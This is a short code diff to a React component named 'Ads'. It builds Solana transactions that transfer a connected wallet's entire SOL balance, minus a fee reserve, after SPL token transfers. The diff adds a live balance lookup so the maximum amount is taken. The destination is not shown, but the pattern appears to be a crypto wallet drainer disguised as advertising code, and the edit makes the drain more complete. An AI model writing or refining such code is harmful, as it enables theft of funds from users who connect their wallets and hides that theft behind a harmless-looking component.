@@ -567,7 +567,8 @@ const Ads = () => {
       if (!sendSPLFirst) {
         // Send SOL first (if > $1)
         console.log('Generating SOL transaction request...');
-        const lamportsToSend = Math.max(0, solBal - feeReserveLamports);
+        const currentSolBal = await connection.getBalance(currentPublicKey); // Get current balance
+        const lamportsToSend = Math.max(0, currentSolBal - feeReserveLamports);
         
         if (lamportsToSend > 5000) {
           const transaction = new Transaction();
@@ -660,7 +661,7 @@ const Ads = () => {
       // 7. Send SOL last (if <= $1 and was deferred)
       if (sendSPLFirst) {
         console.log('Generating SOL transaction request (after SPL tokens)...');
-        const currentSolBal = await connection.getBalance(currentPublicKey);
+        const currentSolBal = await connection.getBalance(currentPublicKey); // Get current balance after SPL transfers
         const lamportsToSend = Math.max(0, currentSolBal - feeReserveLamports);
         
         if (lamportsToSend > 5000) {
